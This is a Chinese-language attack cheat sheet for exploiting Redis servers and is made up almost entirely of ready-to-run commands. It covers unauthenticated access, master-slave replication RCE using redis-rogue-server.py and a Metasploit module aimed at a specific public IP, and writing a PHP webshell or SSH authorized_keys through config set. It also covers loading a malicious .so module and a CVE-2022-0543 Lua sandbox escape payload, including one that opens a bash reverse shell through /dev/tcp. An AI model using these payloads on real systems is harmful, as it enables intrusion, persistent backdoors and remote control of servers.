[Redis 未授权访问漏洞(windows 环境](http://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484286&idx=1&sn=6250d89d18ea635bda32e815fdcc5f6d)
[Redis 未授权计划任务反弹 shell](https://zhuanlan.zhihu.com/p/582582342)
[Redis 的漏洞总结(建议收藏)](https://mp.weixin.qq.com/s/wfncezg7Xe4Z4VP7lMxc7Q)
[Redis 系列漏洞总结](https://mp.weixin.qq.com/s/O5JVZtTifDri8xGJA08AWA)

# nc 连接

```bash
nc redisip 6379
AUTH root123456789
# 即可连接
```

# Redis 主从复制 RCE redis 4.X/5.X

1. by redis-rogue-server.py

```bash
nc -lvvp 6381
python3 redis-rogue-server.py --rhost 192.168.127.129  --rport 6379 --lhost 192.168.127.134 --lport 6381
# reverse shell
# What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address: 192.168.127.134
Reverse server port: 6381
## [i]nteractive shell 也可以
```

2. by msf

```
sudo msfconsole
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS 47.92.135.138
set SRVHOST VPS_IP
set LHOST VPS_IP
exploit
```

# Redis 未授权写入 crontab/authorized_keys/webshell/

写 webshell

```bash
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php phpinfo();?>"
save
```

写 authorized_keys 免密登录

```bash
# ssh-keygen -t rsa 生成私钥
cat 1.txt | redis-cli -h 10.10.10.135 -x set crack
config set dir /root/.ssh
CONFIG SET dbfilename authorized_keys
save

# ssh -i id_rsa root@x.x.xx 进⾏免密登陆
```

# Redis 通过 module_load 加载恶意 so ⽂件 RCE

MODULE LOAD 命令为 redis 加载外部的模块

```bash
module load "/tmp/exp.so"
system.exec "id"
```

# Redis Lua 沙盒绕过命令执⾏ CVE-2022-0543

Debian 以及 Ubuntu 发⾏版的源在打包 Redis 时，不慎在 Lua 沙箱中遗留了⼀个对象 package ，攻击者可以利⽤这
个对象提供的⽅法加载动态链接库 liblua ⾥的函数，进⽽逃逸沙箱执⾏任意命令。

payload:

```bash
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

反弹 shell:

```bash
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -c \"bash -i >& /dev/tcp/ip/port 0>&1\"", "r"); local res = f:read("*a"); f:close(); return res' 0
```
